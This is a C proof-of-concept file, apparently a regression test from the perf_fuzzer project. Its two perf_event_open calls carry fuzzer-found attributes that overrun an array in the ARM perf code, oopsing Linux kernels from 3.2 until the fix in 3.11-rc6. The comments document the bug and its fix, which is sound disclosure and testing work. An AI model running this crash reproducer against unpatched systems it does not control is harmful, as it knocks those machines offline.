/* arm_map_hw_event_oops.c */
/* Oopses the kernel on ARM and ARM64 from 3.2 until 3.11-rc6 */

/* by Vince Weaver <vincent.weaver _at_ maine.edu */

/* This bug found via my perf_fuzzer tool */

/* It is fixed in 3.11-rc6 with d9f966357b14e356 */
/* Also the fix is in 3.10.8 and 3.4.59          */

/* This was likely introduced with Linux 3.2 with 8a16b34e2119       */

/* This causes an oops on my Pandaboard running Linux 3.11-rc4 */
/* The problem is the value of ->config is very large and it   */
/*   overruns the hw_event array in armpmu_map_hw_event in     */
/*   arch/arm/kernel/perf_event.c                              */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include "hw_breakpoint.h"
#include "perf_event.h"

int fd[1024];
struct perf_event_attr pe[1024];
char *mmap_result[1024];

int forked_pid;

int perf_event_open(struct perf_event_attr *hw_event_uptr,
	pid_t pid, int cpu, int group_fd, unsigned long flags) {

	return syscall(__NR_perf_event_open,hw_event_uptr, pid, cpu,
		group_fd, flags);
}

int main(int argc, char **argv) {

	printf("This test causes an oops on an ARM pandabord on 3.11-rc4\n");

	memset(&pe[0],0,sizeof(struct perf_event_attr));
	pe[0].type=PERF_TYPE_HARDWARE;
	pe[0].config=0x2cc61006;
	pe[0].sample_type=0; /* 0 */
	pe[0].read_format=PERF_FORMAT_TOTAL_TIME_ENABLED|PERF_FORMAT_TOTAL_TIME_RUNNING|PERF_FORMAT_GROUP; /* b */
	pe[0].disabled=1;
	pe[0].exclusive=1;
	pe[0].exclude_idle=1;
	pe[0].comm=1;
	pe[0].inherit_stat=1;
	pe[0].enable_on_exec=1;
	pe[0].precise_ip=0; /* arbitrary skid */
	pe[0].mmap_data=1;
	pe[0].sample_id_all=1;
	pe[0].exclude_host=1;
	pe[0].exclude_guest=1;
	pe[0].wakeup_events=2147483647;
	pe[0].bp_type=HW_BREAKPOINT_EMPTY;
	pe[0].branch_sample_type=2147483648ULL;

	fd[0]=perf_event_open(&pe[0],0,0,-1,PERF_FLAG_FD_NO_GROUP /*1*/ );

/* 2 */

	memset(&pe[1],0,sizeof(struct perf_event_attr));
	pe[1].type=PERF_TYPE_RAW;
	pe[1].size=80;
	pe[1].config=0xb6c8ad99;
	pe[1].sample_type=0; /* 0 */
	pe[1].read_format=PERF_FORMAT_TOTAL_TIME_ENABLED|PERF_FORMAT_ID|0x80000010ULL; /* 80000015 */
	pe[1].inherit=1;
	pe[1].exclude_user=1;
	pe[1].exclude_hv=1;
	pe[1].mmap=1;
	pe[1].inherit_stat=1;
	pe[1].task=1;
	pe[1].precise_ip=3; /* must have zero skid */
	pe[1].sample_id_all=1;
	pe[1].exclude_guest=1;
	pe[1].wakeup_events=0;
	pe[1].bp_type=HW_BREAKPOINT_EMPTY;

	fd[1]=perf_event_open(&pe[1],0,0,-1,PERF_FLAG_FD_NO_GROUP /*1*/ );

	/* Replayed 2 syscalls */
	return 0;
}
